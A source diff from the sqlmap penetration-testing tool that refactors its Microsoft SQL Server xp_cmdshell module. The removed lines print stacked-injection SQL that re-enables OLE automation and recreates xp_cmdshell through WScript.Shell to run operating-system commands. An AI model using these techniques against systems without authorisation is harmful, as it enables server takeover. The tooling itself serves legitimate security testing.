@@ -5,6 +5,7 @@ Copyright (c) 2006-2012 sqlmap developers (http://www.sqlmap.org/)
 See the file 'doc/COPYING' for copying permission
 """
 
+from lib.core.agent import agent
 from lib.core.common import Backend
 from lib.core.common import getSPQLSnippet
 from lib.core.common import hashDBWrite
@@ -40,26 +41,19 @@ class xp_cmdshell:
         if Backend.isVersionWithin(("2005", "2008")):
             logger.debug("activating sp_OACreate")
 
-            cmd += "EXEC master..sp_configure 'show advanced options', 1; "
-            cmd += "RECONFIGURE WITH OVERRIDE; "
-            cmd += "EXEC master..sp_configure 'ole automation procedures', 1; "
-            cmd += "RECONFIGURE WITH OVERRIDE; "
-            inject.goStacked(cmd)
+            cmd = getSPQLSnippet(DBMS.MSSQL, "activate_sp_oacreate")
+            inject.goStacked(agent.runAsDBMSUser(cmd))
 
         self.__randStr = randomStr(lowercase=True)
+        self.__xpCmdshellNew = "xp_%s" % randomStr(lowercase=True)
+        self.xpCmdshellStr = "master..%s" % self.__xpCmdshellNew
 
-        cmd += "DECLARE @%s nvarchar(999); " % self.__randStr
-        cmd += "set @%s='" % self.__randStr
-        cmd += "CREATE PROCEDURE xp_cmdshell(@cmd varchar(255)) AS DECLARE @ID int "
-        cmd += "EXEC sp_OACreate ''WScript.Shell'', @ID OUT "
-        cmd += "EXEC sp_OAMethod @ID, ''Run'', Null, @cmd, 0, 1 "
-        cmd += "EXEC sp_OADestroy @ID'; "
-        cmd += "EXEC master..sp_executesql @%s;" % self.__randStr
+        cmd = getSPQLSnippet(DBMS.MSSQL, "create_new_xp_cmdshell", RANDSTR=self.__randStr, XP_CMDSHELL_NEW=self.__xpCmdshellNew)
 
         if Backend.isVersionWithin(("2005", "2008")):
-            cmd += " RECONFIGURE WITH OVERRIDE;"
+            cmd += ";RECONFIGURE WITH OVERRIDE"
 
-        inject.goStacked(cmd)
+        inject.goStacked(agent.runAsDBMSUser(cmd))
 
     def __xpCmdshellConfigure2005(self, mode):
         debugMsg = "configuring xp_cmdshell using sp_configure "
@@ -76,10 +70,9 @@ class xp_cmdshell:
         logger.debug(debugMsg)
 
         if mode == 1:
-            cmd = "EXEC master..sp_addextendedproc 'xp_cmdshell', "
-            cmd += "@dllname='xplog70.dll'"
+            cmd = getSPQLSnippet(DBMS.MSSQL, "enable_xp_cmdshell_2000", ENABLE=str(mode))
         else:
-            cmd = "EXEC master..sp_dropextendedproc 'xp_cmdshell'"
+            cmd = getSPQLSnippet(DBMS.MSSQL, "disable_xp_cmdshell_2000", ENABLE=str(mode))
 
         return cmd
 
@@ -89,7 +82,7 @@ class xp_cmdshell:
         else:
             cmd = self.__xpCmdshellConfigure2000(mode)
 
-        inject.goStacked(cmd)
+        inject.goStacked(agent.runAsDBMSUser(cmd))
 
     def __xpCmdshellCheck(self):
         cmd = "ping -n %d 127.0.0.1" % (conf.timeSec * 2)
@@ -154,7 +147,7 @@ class xp_cmdshell:
         self.__forgedCmd += "SET @%s=%s;" % (self.__randStr, self.__cmd)
         self.__forgedCmd += "EXEC %s @%s" % (self.xpCmdshellStr, self.__randStr)
 
-        return self.runAsDBMSUser(self.__forgedCmd)
+        return agent.runAsDBMSUser(self.__forgedCmd)
 
     def xpCmdshellExecCmd(self, cmd, silent=False):
         cmd = self.xpCmdshellForgeCmd(cmd)
